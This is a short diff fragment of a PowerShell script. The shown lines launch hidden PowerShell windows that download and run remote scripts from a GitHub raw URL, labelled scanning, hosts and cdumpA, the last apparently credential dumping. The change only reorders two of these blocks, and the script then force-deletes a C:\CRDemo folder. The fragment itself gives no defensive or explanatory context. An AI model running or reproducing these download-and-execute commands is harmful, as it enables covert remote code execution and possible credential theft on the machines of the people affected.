@@ -22,10 +22,10 @@ if ((Get-Item -Path 'C:\Program Files\7-Zip\7z.exe' -eq $null)
 #scanning
 powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/33667/scan_33667.ps1')"
 
-#cdumpA
-powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/33667/cdumpa_33667.ps1')"
-
 #hosts
 powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/33667/hosts_33667.ps1')"
+
+#cdumpA
+powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/33667/cdumpa_33667.ps1')"
 
 Remove-Item C:\CRDemo -Recurse -Force
